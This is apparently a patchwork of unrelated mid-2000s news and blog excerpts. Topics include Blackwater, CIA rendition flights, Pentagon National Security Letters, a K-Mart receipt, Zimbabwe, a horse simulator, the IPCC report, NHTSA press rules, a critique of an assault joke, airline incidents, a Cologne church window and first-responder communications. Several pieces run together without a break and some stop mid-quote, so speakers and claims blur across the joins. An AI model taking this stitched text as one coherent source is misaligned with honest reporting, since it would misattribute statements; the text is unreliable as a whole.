Separately , the Washington Post newspaper has reported that mercenaries working for Blackwater were at the centre of an infamous firefight in Iraq in April 2004 when guarding the US headquarters in Najaf – despite never having applied to operate as a private security company in the country ,
The report said that in the battle , footage of which circulated on the internet , the troops had opened fire on Shia Iraqi civilians protesting outside , unleashing rounds so rapidly they had to pause every 15 minutes to allow their gun barrels to cool down .
In his book , Scahill claims that the Blackwater employees in the country are using ‘ experimental ammunition ’ made of ‘ blended metal , which shatter on impact to create untreatable wounds ’ .
Shami Chakrabati , the director of Liberty , alleges that 210 CIA flights carrying terrorist suspects for possible torture have entered Britain since 2001 .
She called for a full investigation , claiming the ACPO probe was unsatisfactory .
“ ACPO have admitted to me in a private letter that their investigation amounted to little more than a cursory review of reports on the issue – which they issued , 18 months after I requested it , to coincide with the Council of Europe ’s report , ” she said .
“ Maybe now The Mail on Sunday has produced this photographic evidence they will conduct a proper inquiry . ”
An ACPO spokeswoman said : “ These planes could be empty – there is no evidence that prisoners were on board . ”
She denied Liberty ’s claim that their inquiry had been limited and driven by spin .
“ There has been a full examination to see if there was any evidence to suggest criminal activity , and there was n’t , ” she said .
A Foreign Office spokeswoman said : “ We have been through the records , and there is no evidence of detainees being rendered through the UK since 1997 . ”
No one at RAF Mildenhall was available for comment .

Just a day before the nation celebrated the life of the once - federally - spied - upon Dr. Martin Luther King Jr. , the New York Times reported that both the Pentagon and the CIA have been issuing subpoenas to domestic financial institutions to investigate possible terrorism .
Although the military and the CIA are largely barred from spying on Americans , the Pentagon has stepped up its surveillance of American citizens after September 11 as part of what it calls " force protection " – that is , the protection of military installations on American soil .
Now , Eric Lichtblau and Mark Mazzetti reveal that both agencies have been using " National Security Letters " – which are self - issued subpoenas for documents .
These subpoenas are widely used by the FBI since they do not require a judge 's approval .
In 2005 , the first year the Justice Department was required to report how often they used this power , the DOJ said it issued 9,254
such letters to get information on 3,501 U.S. citizens and green card holders .
Unlike the FBI 's version , the military and CIAs ' are voluntary .
Pentagon spokesman Maj .
Patrick Ryder said the letters " provide tremendous leads to follow and often with which to corroborate other evidence in the context of counterespionage and counterterrorism , " according to the New York Times .
Vice President Dick Cheney defended the use of the power in an interview Sunday , saying the letters do n't violate civil rights since banks could contest them in court .
The Pentagon said it intended to keep the records it gained from the letters and feed the information into a database run by the Counterintelligence Field Office .
That office houses a database called TALON that included records on peaceful anti-war protesters .
The Pentagon also , in the name of base protection , funded a data - mining study examined ways to study travel database records and commercial data to identify potential travelers .
That study used commercial data provided by Acxiom paired with the entirety of JetBlue 's travel database , which the company secretly handed over in September 2002 to the government in violation of its privacy promises .
While the Pentagon has reportedly issued only a relatively small number of such letters – approximately 500 or so – , civil libertarians say the military has no place investigating American citizens on American soil .
House Intelligence chair Silvestre Reyes said he plans to hold hearings , and I expect the topic to get attention even in Thursday 's Senate Judiciary committee 's planned grilling of Attorney General Alberto Gonzales .

How many customers do you think it takes before K - Mart goes through a mile of paper in cash register receipts ?
It may not be as many as you think .
On Sunday , I found myself needing to purchase a cheap lamp .
So I went down to my local K - Mart and picked one out .
I also bought a light bulb .
Upon checkout , along with the merchandise , I was given this ridiculously long receipt .
I measured it .
It ’s 21 inches long .
I bought two items and got a receipt that ’s 21 inches long .
Is wasting that much paper really necessary ?
I could n’t even get the whole thing to fit on my scanner .
I had to scan it in pieces and then stitch it together in Photoshop .
I did a little math .
If every customer purchases exactly two items ( an underestimation , I ’m sure ) , then K - Mart goes through approximately one mile of paper every 3,017 customers .
Only the top 6 inches of the receipt contains information relevant to the purchase : the date , items purchased , price , store number , etc .
The remaining 15 inches contains ads for things I could have purchased if I ’d known about them before I went to the register , and also a list of store hours .
I do n’t know about you , but when I want to know a store ’s hours or what they sell , I never dig out old receipts to find the answer .
I never even glance at that information .
Are there people who read their old receipts ?
It seems like a big waste of paper to me .
15 wasted inches of paper per customer .
That comes to one mile of paper wasted every 4,224 customers .
How many miles of paper must K - Mart waste every day ?
I was n’t going to attempt to answer that question , but then I realized that once I had my receipt scanned in and resized and placed alongside the text on this page , the image was longer than the text .
And that was messing up the layout of this page , causing my browser to do some weird things .
So I decided to do some more digging and see what I could learn .
K - Mart ’s corporate website has all sorts of information about the number of stores they have , but not the number of customers .
The most recent data I could find was in a BusinessWeek article from 2000 , where K - Mart ’s CEO referenced K - Mart ’s “ 30 million store customers a week . ”
By now , many of those store customers are probably shopping on - line in greater numbers than before , and the number of K - Mart stores has surely changed since they filed for bankruptcy in 2002 , but even if only half as many people still shop in the stores , that comes to 507 miles of paper wasted by K - Mart every single day in useless cash register receipt ads .
I think I see an easy way for K - Mart to become a bit more eco-friendly .
The petrol pumps dried up a month ago .
Water and electricity are off more often than they are on .
The national currency has an expiry date of July 2007 stamped on it but it 's worth hardly anything anyway , so nobody seems to care .
Some Zimbabweans find a perverse comfort in all this because they believe , as the American ambassador put it , that Robert Mugabe is committing regime change on himself with his mad economics .
It can not get any worse , they say , but it can .
As bad as Zimbabwe gets , it still seems that there is a long way to fall .
Mobutu Sese Seko ran Zaire into the ground for more than two decades and was only removed by an invasion .
Successive military governments plundered Nigeria , wrecking its economy and infrastructure and still retained power .
Zimbabwe may be far from the tipping point .
That said , everyone except Mugabe and his inner circle seems to agree that with inflation accelerating so fast no one really knows what it is , and with much of the economy decamped to the black market and a system of bartering , total economic meltdown cannot be far off .
The US ambassador 's prediction sent a shudder through the upper echelons of Zanu - PF ( the ruling party ) and prompted Mugabe to order the police and army into the shops to enforce the cutting of the prices of everything by at least half .
While it demonstrated Mugabe 's loose grasp of the causes of inflation , the efficiency with which reductions were imposed also showed that in some way he remains very much in control .
Mugabe 's neighbours are divided and even those bearing the brunt of his chaos appear paralysed .
He arrived at the summit of southern African Presidents to thunderous applause .
To many , he remains a liberation hero and it offends their African nationalism to see him pushed around by the Americans and British .
The Angolans are behind him .
The Zambians and South Africans are more critical , but Mugabe appears scornful of Thabo Mbeki 's efforts to mediate a settlement between Zanu - PF and the opposition .
Zanu - PF delegates simply did n't turn up for the first round of talks .
When they did , there was little evidence they viewed them as anything more than a sop to Mbeki .
Mbeki says he wants to reach agreement on terms for a free presidential election next year .
Why would Mugabe agree to that ?
He 's spent seven years rigging elections precisely because he knows he 's going to lose and has no intention of surrendering power - at least not to anyone outside Zanu - PF .
He can go into another election pretty much on his own terms and may not need to rig it so much after all .
The opposition is weak and divided and has lost the confidence of the people .
About one - third of the population is estimated to have walked out of the country , most to South Africa .
That relieves pressure on the regime by removing some of those most likely to rebel , along with potential opposition voters .
It also provides a steady stream of hard currency back to Zimbabwe .
Mugabe appears to retain the loyalty of most of the security chiefs , partly because they are old comrades in arms , but also for more immediate interests .
The central bank is little more than a cash dispenser for the elite who buy dollars at the official rate and sell them at 800 times more on the black market .
Some of Mugabe 's inner circle also have good reason to fear what will come next .
The military and police chiefs have enough blood on their hands to face trial under another administration , although the opposition has offered an amnesty and power sharing in an effort to encourage Zanu - PF to dump Mugabe .
Yet there are signs of discontent among those around Mugabe .
Questions continue to swirl around the death of the head of the presidential security guard , Brigadier General Armstrong Gunda , who was supposedly killed when his car was hit by a train .
Six days before Gunda was killed , about 15 members of his force were arrested and accused of plotting a coup , although not the general .
Ordinary Zimbabweans are still trying to work out if there really was a coup plot or whether Mugabe was simply demonstrating once again that he still sets the agenda .
But the mystery over Gunda hints at the direction any solution may have to come from .
The region 's leaders can't provide the solution , neither can Britain .
Change will have to come from within and if the opposition can't do it , perhaps Zanu - PF 's survival instincts will kick in and it will ditch its greatest liability .
But do n't count on it happening soon .

Whether you are a student of riding or an Instructor you know that good consistent school horses are invaluable .
A school horse must be patient , willing , cooperative and alert yet calm .
He must be physically responsive to the aids and balanced and rhythmic in all of his gaits .
The " spirited " horse has plenty to teach a seasoned rider , but when dealing with new riders it helps to have a trustworthy mount .
Imagine a horse that never has an off day , never spooks , tires , or refuses .
He also needs no hay , grain or bedding and never needs a vet or a farrier .
He can build your confidence , perfect your position , and get you in top riding shape .
Sound to good to be true ?
Meet my latest dream horse from Racewood Simulators .
The first WALK , TROT AND CANTERING SIMULATOR in the world .
This is the first time a simulator has automatically changed from a trot to a canter by kick of the leg , just like the real horse it goes faster with applied pressure from the heels , the first kick will make the horse walk a second a trot and kick again to get the cantering action .
This Robohorse could be an awesome teaching tool for riders wanting to develop skills , confidence and stamina .
I would n't even mind having one in my living room for exercise or a sweet party attraction .
The only catch is they cost about as much as a new Lexus , and the nearest manufacturer is in Canada .
For now I 'll have to wait .
Unless they come out with a less expensive version for those of us on a Hyundai budget ...
The world is , it seems , melting like an ice cream cone in the sun .
Let me leave it at that .
As all Tomdispatch readers know , I write the introductions to posts at this site .
This post is undoubtedly the exception that proves the rule .
The editors of The New York Review of Books have been kind enough to let me put out Bill McKibben 's striking essay on the real news lurking in the latest major report on global warming .
( His piece appears in the March 15 issue of the magazine , now on the newsstands . )
McKibben whose new book , Deep Economy : The Wealth of Communities and the Durable Future , is about to be published ( and eagerly awaited by me ) , has been involved in important recent organizing efforts re : climate change .
So I decided to give him the first -- and last -- word today .
Tom
Bill McKibben : " This piece is an account of a scientific triumph -- the ongoing effort to understand and warn about climate change in a timely fashion -- and also , of course , of a political debacle -- the complete failure of our government over two decades to address the problem in any fashion whatsoever .
But it ends with a paragraph about an effort now five weeks old and , so far , entirely confined to the Web .
When we launched stepitup07.org in mid-January , we hoped we might be able to find a couple of hundred groups and individuals around the country who would agree to hold rallies on April 14 .
" That would have represented by far the largest demonstration against global warming in U.S. history .
By this point , our wildest imaginings have been long since surpassed -- we 're nearing 700 actions scheduled for April 14 , and the sheer genius people have brought to designing some of them boggles the mind .
There will be underwater demonstrations , rallies on top of mountains , and on and on .
All of it makes me think of the example and the words of Rebecca Solnit on Tomdispatch.com in recent years :
As far as I can tell , she 's absolutely right in her confidence that people around the country and around the world can , joyfully and powerfully , rise to the challenges in front of us .
People power is a lovely thing to behold ! "
When the Intergovernmental Panel on Climate Change ( IPCC ) issued its latest report in early February , it was greeted with shock : " World Wakes to Climate Catastrophe , " reported an Australian paper .
But global warming is by now a scientific field with a fairly extensive history , and that history helps set the new findings in context -- a context that makes the new report no less terrifying but much more telling for its unstated political implications .
Although atmospheric scientists had studied the problem for decades , global warming first emerged as a public issue in 1988 when James Hansen , a NASA scientist , told Congress that his research , and the work of a handful of other scientists , indicated that human beings were dangerously heating the planet , particularly through the use of fossil fuels .
This bold announcement set off a scientific and political furor : many physicists and chemists played down the possibility of serious harm , and many governments , though feeling pressure to react , did little to restrain the use of fossil fuel .
" More research " was the mantra everyone adopted , and funding for it flowed freely from governments and foundations .
Under the auspices of the United Nations , scientists and governments set up a curious hybrid , the IPCC , to track and report on the progress of that research .
From roughly 1988 to 1995 , the hypothesis that burning coal and gas and oil in large quantities was releasing carbon dioxide and other gases that would trap the sun 's radiation on Earth and disastrously heat the planet remained just that : a hypothesis .
Scientists used every means at their disposal to reconstruct the history of the earth 's climate and to track current changes .
For example , they studied the concentration of greenhouse gases in ancient air trapped in glacial cores , sampled the atmosphere with weather balloons , examined the relative thickness of tree rings , and observed the frequency of volcanic eruptions .
Most of all , they refined the supercomputer models of the earth 's atmosphere in an effort to predict the future of the world 's weather .
By 1995 , the central Herculean tasks of both research and synthesis were largely complete .
The report the IPCC issued that year was able to assert that " the balance of evidence suggests " that human activity was increasing the planet 's temperature and that it would be a serious problem .
This was perhaps the most significant warning our species , as a whole , has yet been given .
The report declared ( in the pinched language of international science ) that humans had grown so large in numbers and especially in appetite for energy that they were now damaging the most basic of the earth 's systems -- the balance between incoming and outgoing solar energy .
Although huge amounts of impressive scientific research have continued over the twelve years since then , their findings have essentially been complementary to the 1995 report -- a constant strengthening of the simple basic truth that humans were burning too much fossil fuel .
The 1995 consensus was convincing enough for Europe and Japan : the report 's scientific findings were the basis for the Kyoto negotiations and the treaty they produced ; those same findings also led most of the developed world to produce ambitious plans for reductions in carbon emissions .
But the consensus did n't extend to Washington , and hence everyone else 's efforts were deeply compromised by the American unwillingness to increase the price of energy .
Our emissions continued to soar , and the plans of many of the Kyoto countries in Western Europe to reduce emissions sputtered .
( At the same time , most tragically of all , China and India had just begun their rapid industrial takeoffs using precisely the technologies we then knew were wreaking havoc ; they did not seek or find much aid from the Western countries that could have encouraged them to take a more benign path . )
In 2001 , the IPCC issued its Third Assessment Report ( TAR ) , but it coincided with the start of the Bush administration , which refused even to consider a serious policy for climate .
The IPCC 's new Fourth Assessment of this February ( known as AR4 ) arrives at a more congenial moment , as the new Democratic Congress takes up a wide variety of legislation designed , finally , to curb emissions .
The finding of the new report that attracted the most attention in the press was that scientists were now more confident than ever that the warming we 've seen so far ( about one degree Fahrenheit in the average global temperature ) was caused by human beings .
Instead of being merely " likely , " the conclusion was now " very likely , " which in the IPCC 's lexicon means better than a 90 % chance .
But it 's been years since any reputable scientist specializing in climate research doubted that conclusion .
More important findings were ignored in accounts of the report and in some cases were obscured by the document 's very poor prose , which is much more opaque than its predecessors .
Those findings include :
* The amount of carbon in the atmosphere is now increasing at a faster rate even than before .
* Temperature increases would be considerably higher than they have been so far were it not for the blanket of soot and other pollution that is temporarily helping to cool the planet .
* Alternative explanations for some of the warming ( for example , sunspot activity and the " urban heat island effect , " the raising of temperatures in cities caused by high building densities and the use of heat - retaining materials such as concrete and asphalt ) are now known to be relatively negligible .
* Almost everything frozen on earth is melting .
Heavy rainfalls are becoming more common since the air is warmer and therefore holds more water than cold air , and " cold days , cold nights and frost have become less frequent , while hot days , hot nights , and heat waves have become more frequent . "
These facts serve as the prelude to the most important part of the new document , its predictions for what is to come .
Here , too , the news essentially confirms the previous report , and indeed most of the predictions about climate change dating back to the start of research : if we do n't take the most aggressive possible measures to curb fossil fuel emissions immediately , then we will see temperature increases of -- at the best estimate -- roughly five degrees Fahrenheit during this century .
Technically speaking , that 's enormous , enough to produce what James Hansen has called a " totally different planet , " one much warmer than that known by any of our human ancestors .
The process by which the IPCC conducts its deliberations -- scientists and national government representatives quibbling at enormous length over wording and interpretation -- is Byzantine at best , and makes the group 's achievements all the more impressive .
But it sacrifices up - to - the - minute assessment of data in favor of lowest - common - denominator conclusions that are essentially beyond argument .
That 's a reasonable method , but one result is that the " shocking " conclusions of the new report in fact lag behind the most recent findings of climate science by several years .
That 's most obvious here in the discussion of the rise in sea level .
Researchers know that sea levels will rise fairly quickly this century , in part because of the melting of mountain glaciers and in part because warm water takes up more space than cold .
The new assessment refines the calculations of the rise in sea level and puts the best estimate at a foot or two , which is actually slightly less than the last assessment in 2001 .
Though it does n't sound like much , a couple of feet is actually a large amount -- enough to inundate many low - lying areas and drown much of the Earth 's coastal marshes and wetlands .
Still , it might be more or less manageable .
During the last eighteen months , however , new research has indicated that a far more rapid rise in sea level may be possible , because the great ice sheets of Greenland and the Antarctic appear to have begun moving more quickly toward the sea .
Some of this research appeared in Al Gore 's movie An Inconvenient Truth , and James Hansen has written in The New York Review about this new information ; it is responsible for much of the recent increase in the level of alarm .
But it is not included in the IPCC report , except as a caveat : " larger values cannot be excluded , but understanding of these effects is too limited to assess their likelihood or provide a best estimate or an upper bound for sea level rise . "
In short , the new report is a remarkably conservative document .
That it is still frightening in its predictions simply indicates the huge magnitude of the changes we 're now causing , changes far larger than most people fully understand .
Even using its conservative projections , the panel states unequivocally that typhoons and hurricanes will likely become more intense ; that sea ice will shrink and perhaps disappear in the summertime Arctic ; that snow cover will contract .
Later this year , a second working group will outline the effects of these changes on humans , translating inches of sea - level rise into numbers of refugees , showing the effects of increases in temperature and humidity on malaria - carrying mosquitoes as well as the impact of heat waves on crop losses .
The language will still be bloodless , but the findings obviously wo n't .
The IPCC has always avoided taking political positions -- it does n't recommend specific policies -- and it continues this tradition with its new report .
In its discussions of the momentum of climate change , however , it does introduce one particularly disturbing statistic .
Because of the time lag between carbon emissions and their effect on air temperature , even if we halted the increase in coal , oil , and gas burning right now , temperatures would continue to rise about two tenths of a degree Celsius per decade .
But , the report writes , " if all radiative forcing agents [ i.e. , greenhouse gases ] are held constant at year 2000 levels , a further warming trend would occur in the next two decades at a rate of about 0.1 ºC per decade . "
Translated into English , this means , to put it simply , that if world leaders had heeded the early warnings of the first IPCC report , and by 2000 had done the very hard work to keep greenhouse gas emissions from growing any higher , the expected temperature increase would be half as much as is expected now .
In the words of the experts at realclimate.org , where the most useful analyses of the new assessment can be found , climate change is a problem with a very high " procrastination penalty " : a penalty that just grows and grows with each passing year of inaction .
This is why the most important news about climate at the moment may come not from the IPCC but from Washington .
After twenty years of inactivity -- a remarkably successful bipartisan effort to accomplish nothing -- the first few weeks of the new Congress have witnessed a flurry of activity .
A series of bills have been introduced by people ranging from California Representative Henry Waxman and Vermont Senator Bernie Sanders to Arizona 's John McCain that would call for more or less aggressive carbon reduction targets .
Some of the bills would set in place a " cap - and - trade " system that would set overall limits on emissions of carbon dioxide but would allow companies to freely buy and sell credits permitting them to emit certain amounts of it ; this would produce a market for carbon - cutting measures .
The IPCC report does n't call for particular reduction figures .
It does , however , make clear that reduction in emissions must be quick and deep .
There is no more optimistic alternative .
Even if we do everything right , we 're still going to see serious increases in temperature , and all of the physical changes ( to one extent or another ) predicted in the report .
However , there 's reason to hope that if the US acts extremely aggressively and quickly we might be able to avoid an increase of two degrees Celsius , the rough threshold at which runaway polar melting might be stopped .
This means that any useful legislation will have to feature both a very rapid start to reductions and a long and uncompromising mandate to continue them .
Sanders 's bill , also endorsed by California 's Barbara Boxer , who heads the relevant committee , comes closest to that standard .
It calls for an eventual 80 % cut in emissions by 2050 .
McCain 's bill , cosponsored by one of his challengers for the presidency , Barack Obama , is somewhat weaker in its eventual targets .
But the bargaining has barely begun , and in any event quick initial implementation of any cuts will be almost as important as the final numbers .
No one expects President Bush to sign such a bill .
In fact , it was widely considered a minor miracle that he uttered the words " climate change " in this year 's State of the Union address .
( His limp proposal , centering on alternative fuels for some vehicles , was equally widely considered a dud . )
What 's happening now has much to do with positioning for the next presidential election , and the legislation that will eventually be passed and signed in 2009 .
What the IPCC report makes clear by implication is that that legislation will be our last meaningful chance : anything less than an all - out assault on carbon in our economy will be rendered meaningless by the increasing momentum of global warming .
And of course by now our economy is only part of the problem .
Though we use more energy per capita than any other country , the Chinese may pass us in total carbon emissions by decade 's end .
Even if we start to get our own house in order , we 'll need to figure out how , with desperate speed , to lead an equally sweeping international response .
The only really encouraging development is the groundswell of public concern that has built over the last year , beginning with the reaction to Hurricane Katrina and Al Gore 's movie .
In January , a few of us launched an initiative called stepitup07.org .
It calls for Americans to organize rallies in their own communities on April 14 asking for congressional action .
In the first few weeks the website was open , more than six hundred groups in forty - six states registered to hold demonstrations -- this will clearly be the largest organized response to global warming yet in this country .
The groups range from environmental outfits to evangelical churches to college sororities , united only by the visceral sense ( fueled in part by this winter 's bizarre weather ) that the planet has been knocked out of whack .
The IPCC assessment offers a modest account of just how far out of whack it is -- and just how hard we 're going to have to work to have even a chance at limiting the damage .

Bizarre message discipline at the NHTSA
The National Highway Traffic Safety Administration is filled with experts on cars , transportation , accident data , safety measures , bridge integrity , and the like .
Occasionally , reporters might have a question about one of these issues , so they ’ll call the NHTSA to utilize this public , taxpayer - financed expertise .
But that ’s apparently no longer an option .
Readers G.D. and W.H. alerted me to this unbelievable report from the NYT ’s Christopher Jensen , who covers the automotive beat for the paper of record .
Jensen found that the NHTSA wo n’t even allow its communications office to go on the record in acknowledging the name of the agency ’s director .
The agency charged with providing public information about the nation ’s top automotive safety agency forbids staffers from answering reporters ’ questions .
The policy is the brainchild of NHTSA Administrator Nicole Nason , who took control of the agency in May 2006 .
I found this out recently when I asked to talk to an N.H.T.S.A. researcher about some technical safety issues in which he had a great deal of expertise .
Agency officials told me I could talk to the expert on a background basis , but if I wanted to use any information or quotes from him , that would have to be worked out later with a N.H.T.S.A. official .
The arrangement struck me as manipulative , and I declined to agree to it .
It seems that Ms. Nason has adopted a policy that has blocked virtually all of her staff — including the communications office — from providing any information to reporters on the record , which means that it can be attributed .
As an alternative I was told I could interview Ms. Nason on the record ( instead of the expert on the subject of my article ) .
I declined , failing to see how her appointment as administrator — she was trained as a lawyer — made her an expert in that subject .
When I said I would like to talk to Ms. Nason on the record about her no-attribution policy , she was not available .
Got that ?
You ca n’t talk to the expert , but you can talk to the politically - appointed boss .
If you want to talk to the boss about why you ca n’t talk to the expert , the boss is no longer available .
Wait , it gets funnier .
The agency ’s new policy effectively means that some of the world ’s top safety researchers are no longer allowed to talk to reporters or to be freely quoted about automotive safety issues that affect pretty much everybody .
“ My God , ” said Joan Claybrook , who was N.H.T.S.A. administrator from 1977 to 1981 and is now president of Public Citizen , a consumer advocacy group .
Given that N.H.T.S.A. is the leading source of automotive safety information in the United States , its researchers are public officials and people are entitled to “ know what information they have , whether it is on paper or in their heads , ” Ms. Claybrook said . [… ]
[ I ] t is a radical change from the way N.H.T.S.A has operated for at least 20 years .
In the past , reporters could talk to its experts and the agency was proud to discuss its research and accomplishments .
The NYT ’s Jensen talked to Nason ’s chief of staff , David Kelly , who said that the agency ’s new administration felt the change was necessary because and “ we were finding a lot of stuff did not need to be on the record . ”
After Jensen and Kelly talked on the phone , Kelly insisted that he did not want to be quoted and had intended to speak only on background .
Jensen quoted him anyway , deciding the official could n’t make up ground - rules after the fact .
I ’ve heard of message discipline , but this is ridiculous .

Male lactation seems like an urban legend , albeit one with a long history – among other places , it 's mentioned in the Talmud and Anna Karenina .
But it 's quite real .
Scientific American runs through the history and science of man milk , which males of many species are capable of producing ( though only one , the Dayak fruit bat , actually does so . )
It 's not clear whether this capacity once gave our own species an evolutionary boost , with our male ancestors – perhaps those who were injured and homebound – helping nurse the tribe 's kids , or if lactation is a feature that both genders happen to share but is more pronounced in women .
Either way , one could imagine male lactation being very handy in the modern world , helping to balance the demands placed on working mothers .
Of course , the ick factor would be tough to overcome – I can just imagine bragging about this in an online personal ...

It 's been said before : " Denial ai n't just a river in Egypt , " but this might be a whole new low for delusional thinking .
ThinkProgress :
In Oct. 2004 , President Bush finally admitted that Saddam Hussein had no weapons of mass destruction : " Iraq did not have the weapons that our intelligence believed were there . "
Yet according to former White House chief of staff Andy Card , this statement was just rhetoric .
In his new book on Bush , Robert Draper writes that the President continued to privately insist through April 2006 that Saddam had possessed weapons of mass destruction :
August 28 , 2007 — Deacon Duncan
A blogger at passionateamerica.com has a bit of Monday Morning “ humor ” that ( perhaps without meaning to ) gives us a good hard look at how God really “ works ” :
A United States Marine was attending some college courses between assignments .
He had completed missions in Iraq and Afghanistan .
One of the courses had a professor who was a vowed atheist and a member of the ACLU .
One day the professor shocked the class when he came in .
He looked to the ceiling and flatly stated , “ God , if you are real , then I want you to knock me off this platform .
I ’ll give you exactly 15 minutes . ”
The lecture room fell silent .
You could hear a pin drop .
Ten minutes went by and the professor proclaimed , “ Here I am God .
I ’m still waiting . ”
It got down to the last couple of minutes when the Marine got out of his chair , went up to the professor , and cold - cocked him ; knocking him off the platform .
The professor was out cold .
The Marine went back to his seat and sat there , silently .
The other students were shocked and stunned and sat there looking on in silence .
The professor eventually came to , noticeably shaken , looked at the Marine and asked , “ What the hell is the matter with you ?
Why did you do that ? ”
The Marine calmly replied , “ God was too busy today protecting America ’s soldiers who are protecting your right to say stupid stuff and act like an a $ $ .
So , He sent me . ”
Funny stuff , eh ?
I mean , what ’s not to love ?
The assault victim was not only a college professor ( i.e. educated and thus automatically evil ) , he was also a “ vowed atheist ” ( gasp ! ) and if that were n’t bad enough , he was even a member of the ACLU ( swoon ! ) .
The author left out “ Darwinist , ” but that was probably just an oversight .
Would n’t every passionate American just love to go around punching out liberals , atheists , and educated people ?
This is n’t just a joke , it ’s a wish - fulfillment fantasy .
Like all good fantasy , this one draws its power from making the setting seem as realistic as possible .
What makes the joke really work , especially on the wish - fulfillment level , is the faithfulness with which it reproduces the way God behaves in the real world .
Notice , for example , that at no point does God ever actually show up anywhere in the real world .
He does not show up in response to the professor ’s challenge , nor does
He show up to tell the Marine , in the sight and hearing of the other students , to go up and punch out the professor .
Nor , in fact , does
He show up in the war zone to genuinely protect the soldiers .
If God did show up in Iraq , for example , to point out where the insurgents were hiding and where the IED ’s were planted , not only would our troops be in a lot less danger , but the Marine would be able to point to God ’s visible and verifiable activity in Iraq as a satisfactory answer to the professor ’s challenge .
But God does not , in fact , show up in the real world , an absence that the Marine finds frustrating and infuriating .
He seethes with inner rage and helplessness , because God consistently fails to behave as though
He believed the same things the Marine does , and yet the Marine cannot confront God about this nor can he admit , even to himself , that there ’s anything wrong with God ’s behavior .
To do so would be to cast doubts on his own faith and his own personal sense of salvation .
This frustrated and impotent inner tension is what drives the joke , of course .
The author , and his intended readers , all know first - hand how the Marine feels .
God ’s behavior is clearly inconsistent with what they believe about Him , and there ’s not a damn thing they can do about it .
They ca n’t even complain about it , because to complain about it , they ’d first have to admit that it ’s true , and that would be a denial of their faith .
So they ’ve got all this anger and frustration building up , and nowhere for it to go .
What are they to do ?
The Marine , in the story , takes the only available outlet : he makes the poor professor the scapegoat for his own inner turmoil , and lashes out violently against him .
Many Christians feel the same way , though most of them ( fortunately ) are more self - restrained than the Marine in this story , contenting themselves with name - calling and nasty jokes ( like this one ) directed against whoever they decide should be the scapegoat this week .
Ironically , after violently assaulting the professor for what he said , the Marine then self - righteously admits that the professor has a legitimate right to free speech , which his fellow troops are fighting to protect even as he , the Marine , is busy violating it .
But I digress .
The main point is that the professor gets knocked off his platform–but notice , it took a real person do actually do it .
Had the Marine not acted , the “ work ” ( knocking off the professor ) would not have gotten done .
The real person did the work , and then tried to claim that God deserved credit for what was done .
This is the secret .
This is how God really “ works ” in the real world : somebody thinks they know what God ought to be doing , then they sit there stewing about it because God ’s obviously not taking care of the matter , then they jump up and do it themselves , then they claim that God ought to be given credit for having gotten the job done .
A classic case of sock - puppet deity .
Rather pitiful , really , but so long as God persists in failing to show up in the real world it ’s the best Christians have to offer .
Mr. Anonymous And Probably Fictitious Marine , I salute you .
You may have acted violently , ignorantly , and unjustly , but you at least gave us a clear demonstration of how Christians perpetuate the delusion that God actually does things in the real world .
An American Airlines flight from Los Angeles to London this morning made an unscheduled stop at New York 's John F Kennedy International Airport after a member of the flight crew " alerted security on the ground that there may be a suspicious person on board , and the decision was made to divert the flight " , Flight International reports .
The man in question had " raised some eyebrows " aboard flight 136 by boarding the aircraft using an AA employee bus , thereby bypassing LAX security , even though he was on a private trip .
A flight attendant who questioned him onboard was not satisfied he was an AA employee , and duly informed the pilot .
When the plane landed in NY at 4 am , Transportation Security Administration operatives arrested the suspect , described as being of " Middle Eastern origin " .
He was questioned while the aircraft was searched and passengers rescreened , without result .
US Homeland Security Secretary Michael Chertoff later confirmed the man was an employee who was flying in a private capacity .
He told CNN the incident may have been a " misunderstanding " , adding : " I think the good news here , of course , is an alert crew sees something that 's anomalous or seems questionable and they take action . "
Flight 136 was cancelled , and passengers reassigned to other London - bound aircraft . ®
For nearly four hours last Thursday night , Flight 5637 , a 50 - seat regional jet , was stuck on the ground by bad weather at Kennedy International Airport .
The air - conditioning was n’t working , and no one seemed to have a clue about when the plane would take off .
I wish I could say I was writing about this because the situation was unusual .
Or that it was as bad as air travel can get .
But I can’t .
What was unusual was that one passenger on the flight , David Ollila , runs a company that makes video cameras the size of a roll of quarters for mountain bikers , skiers and other amateur athletes to attach to their helmets and capture their thrills .
And Mr. Ollila had one of those little cameras with him .
He marched up to the plane ’s front , stood a few feet from the open cockpit door and interviewed the captain , demanding to know why something was n’t being done to get the passengers off the plane .
__Blood - spurting martyrs , biblical __parables , ascendant doves — most church windows feature the same preachy images that have awed parishioners for centuries .
But a new stained - glass window in Germany 's Cologne Cathedral , to be completed in August , evokes technology and science , not religion and the divine .
Contemporary German artist Gerhard Richter designed the 65 - foot - tall work to replace the original , destroyed by bombs in World War II .
As a starting point , he used his own 1974 painting 4096 Colors .
To create that piece — a 64 - by - 64 grid of squares —
Richter devised a mathematical formula to systematically mix permutations of the three primary colors and gray .
Funny coincidence : 4,096 is also the number of " Web - smart " colors that display consistently on older computer screens , a limitation some Web designers still take into account .
( Today 's monitors , of course , can handle pretty much any hue . )
The Cologne window is made of 11,500 four - inch " pixels " cut from original antique glass in a total of 72 colors .
Why not 4,096 ?
Turns out there are stained glass - smart colors , too .
Some hues in Richter 's initial design were either historically inaccurate or too pale — they would have outshone the squares around them .
So the artist modified his palette to include only colors with a suitably archaic cast .
Because it 's fine for a church window to look like it 's been designed by a computer , as long as it's a computer with a gothic sensibility .

Photo : Associated Press / Jacob Reynolds *
I live in Minneapolis , so the collapse of the Interstate 35W bridge over the Mississippi River earlier this month hit close to home , and was covered in both my local and national news .
Much of the initial coverage consisted of human interest stories , centered on the victims of the disaster and the incredible bravery shown by first responders : the policemen , firefighters , EMTs , divers , National Guard soldiers and even ordinary people , who all risked their lives to save others .
( Just two weeks later , three rescue workers died in their almost - certainly futile attempt to save six miners in Utah . )
Perhaps the most amazing aspect of these stories is that there 's nothing particularly amazing about it .
No matter what the disaster – hurricane , earthquake , terrorist attack – the nation 's first responders get to the scene soon after .
Which is why it 's such a crime when these people can't communicate with each other .
Historically , police departments , fire departments and ambulance drivers have all had their own independent communications equipment , so when there 's a disaster that involves them all , they can't communicate with each other .
A 1996 government report ( .pdf ) said this about the first World Trade Center bombing in 1993 : " Rescuing victims of the World Trade Center bombing , who were caught between floors , was hindered when police officers could not communicate with firefighters on the very next floor . "
And we all know that police and firefighters had the same problem on 9/11 .
You can read details in firefighter Dennis Smith 's book and 9/11 Commission testimony ( .pdf ) .
The 9/11 Commission Report discusses this as well : Chapter 9 talks about the first responders ' communications problems , and commission recommendations for improving emergency - response communications are included in Chapter 12 ( pp. 396-397 ) .
In some cities , this communication gap is beginning to close .
Homeland Security money has flowed into communities around the country .
And while some wasted it on measures like cameras , armed robots and things having nothing to do with terrorism , others spent it on interoperable communications capabilities .
